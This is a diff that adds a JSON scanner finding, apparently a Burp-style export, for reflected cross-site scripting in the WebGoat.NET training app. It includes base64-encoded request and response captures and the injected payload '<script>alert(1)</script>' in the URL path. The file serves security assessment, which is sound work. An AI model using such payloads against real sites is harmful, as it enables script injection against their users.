@@ -1,0 +1,78 @@
+{
+  "name": "Cross-site scripting (reflected)",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Certain",
+  "host": "",
+  "path": "/webgoat.net/App_Themes/Default/01.960_24_col.css",
+  "url": "/webgoat.net/App_Themes/Default/01.960_24_col.css",
+  "evidence": [
+    {
+      "type": "FirstOrderEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "aDdkNmo8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+Z2Z6b2s=",
+          "flags": 4
+        },
+        "band_flags": [
+          "in_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.113/webgoat.net/App_Themes/Default/01.960_24_col.cssh7d6j%3cscript%3ealert(1)%3c/script%3egfzok",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC93ZWJnb2F0Lm5ldC9BcHBfVGhlbWVzL0RlZmF1bHQvMDEuOTYwXzI0X2NvbC5jc3M=",
+            "length": 53
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "aDdkNmolM2NzY3JpcHQlM2VhbGVydCgxKSUzYy9zY3JpcHQlM2VnZnpvaw==",
+            "length": 43
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuMTEzDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClNlYy1DSC1VQTogIkdvb2dsZSBDaHJvbWUiO3Y9IjEzOCIsICJOb3Q9QT9CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTM4Ig0KU2VjLUNILVVBLU1vYmlsZTogPzANClNlYy1DSC1VQS1QbGF0Zm9ybTogIkxpbnV4Ig0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM4LjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9jc3MsKi8qO3E9MC4xDQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29ubmVjdGlvbjogY2xvc2UNCkNvb2tpZTogQVNQLk5FVF9TZXNzaW9uSWQ9ODM3QTBCNjgyNjRCODJCMzVGNkQyMzJBOyBhY29wZW5kaXZpZHM9c3dpbmdzZXQsam90dG8scGhwYmIyLHJlZG1pbmU7IGFjZ3JvdXBzd2l0aHBlcnNpc3Q9bmFkYQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS4xMTMvd2ViZ29hdC5uZXQvRGVmYXVsdC5hc3B4DQoNCg==",
+            "length": 697
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KRGF0ZTogVHVlLCAwMiBTZXAgMjAyNSAxMzowMjowNiBHTVQNClNlcnZlcjogQXBhY2hlLzIuMi4xNCAoVWJ1bnR1KSBtb2RfbW9uby8yLjQuMyBQSFAvNS4zLjItMXVidW50dTQuMzAgd2l0aCBTdWhvc2luLVBhdGNoIHByb3h5X2h0bWwvMy4wLjEgbW9kX3B5dGhvbi8zLjMuMSBQeXRob24vMi42LjUgbW9kX3NzbC8yLjIuMTQgT3BlblNTTC8wLjkuOGsgUGh1c2lvbl9QYXNzZW5nZXIvNC4wLjM4IG1vZF9wZXJsLzIuMC40IFBlcmwvdjUuMTAuMQ0KWC1Bc3BOZXQtVmVyc2lvbjogMi4wLjUwNzI3DQpDb250ZW50LUxlbmd0aDogMjMzNw0KQ2FjaGUtQ29udHJvbDogcHJpdmF0ZQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04DQoNCjw/eG1sIHZlcnNpb249IjEuMCIgPz4KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4i",
+            "length": 615
+          },
+          {
+            "type": "SnipSegment",
+            "length": 1504
+          },
+          {
+            "type": "DataSegment",
+            "data": "PC9zdHJvbmc+L3dlYmdvYXQubmV0L0FwcF9UaGVtZXMvRGVmYXVsdC8wMS45NjBfMjRfY29sLmNzcw==",
+            "length": 58
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "aDdkNmo8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+Z2Z6b2s=",
+            "length": 35
+          },
+          {
+            "type": "DataSegment",
+            "data": "PC9wPg==",
+            "length": 4
+          },
+          {
+            "type": "SnipSegment",
+            "length": 536
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "8"
+      }
+    }
+  ],
+  "description": "The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>h7d6j&lt;script&gt;alert(1)&lt;/script&gt;gfzok</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
+  "remediation": "",
+  "references": []
+}
